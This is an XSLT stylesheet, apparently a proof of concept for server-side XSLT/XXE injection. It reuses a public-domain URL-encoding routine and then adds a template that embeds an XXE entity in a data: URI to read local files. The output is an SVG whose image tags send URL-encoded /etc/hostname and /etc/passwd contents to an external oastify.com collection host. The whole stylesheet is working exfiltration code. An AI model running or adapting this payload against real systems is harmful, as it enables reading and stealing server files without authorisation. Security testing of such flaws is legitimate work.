 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
 <xsl:output method="xml" indent="yes" encoding="iso-8859-1"/>
 <!-- ISO-8859-1 based URL-encoding demo
       Written by Mike J. Brown, mike@skew.org.
       Updated 2015-10-24 (to update the license).
       License: CC0 <https://creativecommons.org/publicdomain/zero/1.0/deed.en>
       Also see http://skew.org/xml/misc/URI-i18n/ for a discussion of
       non-ASCII characters in URIs.
  -->
 <!-- Characters we'll support.
       We could add control chars 0-31 and 127-159, but we won't. -->
 <xsl:variable name="ascii"> !"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?
 @ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~</xsl:variable>
 <xsl:variable
 name="latin1">&#160;&#161;&#162;&#163;&#164;&#165;&#166;&#167;&#168;&#169;&#170;&#171;&
 #172;&#173;&#174;&#175;&#176;&#177;&#178;&#179;&#180;&#181;&#182;&#183;&#184;&#185;&#18
 6;&#187;&#188;&#189;&#190;&#191;&#192;&#193;&#194;&#195;&#196;&#197;&#198;&#199;&#200;&
 #201;&#202;&#203;&#204;&#205;&#206;&#207;&#208;&#209;&#210;&#211;&#212;&#213;&#214;&#21
 5;&#216;&#217;&#218;&#219;&#220;&#221;&#222;&#223;&#224;&#225;&#226;&#227;&#228;&#229;&
 #230;&#231;&#232;&#233;&#234;&#235;&#236;&#237;&#238;&#239;&#240;&#241;&#242;&#243;&#24
 4;&#245;&#246;&#247;&#248;&#249;&#250;&#251;&#252;&#253;&#254;&#255;</xsl:variable>
 <xsl:variable
 name="safe">!'()*-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz~</
 xsl:variable>
 <xsl:variable name="hex" >0123456789ABCDEF</xsl:variable>
 <xsl:template name="url-encode">
 <xsl:param name="str"/>
 <xsl:if test="$str">
 <xsl:choose>
 <xsl:when test="string-length($str) &gt; 400">
 <!-- Portion up the input so as not to hit max recursion limits -->
 <xsl:call-template name="url-encode">
 <xsl:with-param name="str" select="substring($str,1,400)"/>
 </xsl:call-template>
 <xsl:call-template name="url-encode">
 <xsl:with-param name="str" select="substring($str,401)"/>
 </xsl:call-template>
 </xsl:when>
 <xsl:otherwise>
 <xsl:variable name="first-char" select="substring($str,1,1)"/>
 <xsl:choose>
 <xsl:when test="contains($safe,$first-char)">
 <xsl:value-of select="$first-char"/>
 </xsl:when>
 <xsl:otherwise>
 <xsl:variable name="codepoint">
 <xsl:choose>
 <xsl:when test="contains($ascii,$first-char)">
 <xsl:value-of select="string-length(substring-before($ascii,$first
char)) + 32"/>
 </xsl:when>
 <xsl:when test="contains($latin1,$first-char)">
 <xsl:value-of select="string-length(substring-before($latin1,
 $first-char)) + 160"/>
 </xsl:when>
 <xsl:otherwise>
 <xsl:message terminate="no">Warning: string contains a character 
that is out of range! Substituting "?".</xsl:message>
 <xsl:text>63</xsl:text>
 </xsl:otherwise>
 </xsl:choose>
 </xsl:variable>
 <xsl:variable name="hex-digit1" select="substring($hex,floor($codepoint div 
16) + 1,1)"/>
 <xsl:variable name="hex-digit2" select="substring($hex,$codepoint mod 16 + 
1,1)"/>
 <xsl:value-of select="concat('%',$hex-digit1,$hex-digit2)"/>
 </xsl:otherwise>
 </xsl:choose>
 <xsl:if test="string-length($str) &gt; 1">
 <xsl:call-template name="url-encode">
 <xsl:with-param name="str" select="substring($str,2)"/>
 </xsl:call-template>
 </xsl:if>
 </xsl:otherwise>
 </xsl:choose>
 </xsl:if>
 </xsl:template>
 <xsl:template name="read-file">
 <xsl:param name="filepath"/>
 <xsl:variable name="filedata">
 <xsl:copy-of select="document(concat('data:,
 %3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C%21DOCTYPE%20xxe%20
 %5B%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file://', $filepath, 
'%22%3E%20%5D%3E%0A%3Cxxe%3E%0A%26xxe%3B%0A%3C%2Fxxe%3E'))"/>
 </xsl:variable>
 <xsl:if test="string-length($filedata) &gt; 0">
 <xsl:call-template name="url-encode">
 <xsl:with-param name="str" select="$filedata"/>
 </xsl:call-template>
 </xsl:if>
 </xsl:template>
 <!-- Output template -->
 <xsl:template match="/">
 <svg xmlns="http://www.w3.org/2000/svg">
 <foreignObject width="300" height="600">
 <div xmlns="http://www.w3.org/1999/xhtml">
 <img>
 <xsl:attribute name="src">
 <!-- Leak /etc/hostname -->
 <xsl:value-of select="'https://easq3c0ela485jozycfaa1xyqpwgk7pve.oastify.com/?msg='"/>
 <xsl:call-template name="read-file">
 <xsl:with-param name="filepath" select="'/etc/hostname'"/>
 </xsl:call-template>
 </xsl:attribute>
 </img>
 <img>
 <xsl:attribute name="src">
 <!-- Leak /etc/passwd -->
 <xsl:value-of select="'https://easq3c0ela485jozycfaa1xyqpwgk7pve.oastify.com/?msg='"/>
 <xsl:call-template name="read-file">
 <xsl:with-param name="filepath" select="'/etc/passwd'"/>
 </xsl:call-template>
 </xsl:attribute>
 </img>
 </div>
 </foreignObject>
 </svg>
 </xsl:template>
 </xsl:stylesheet>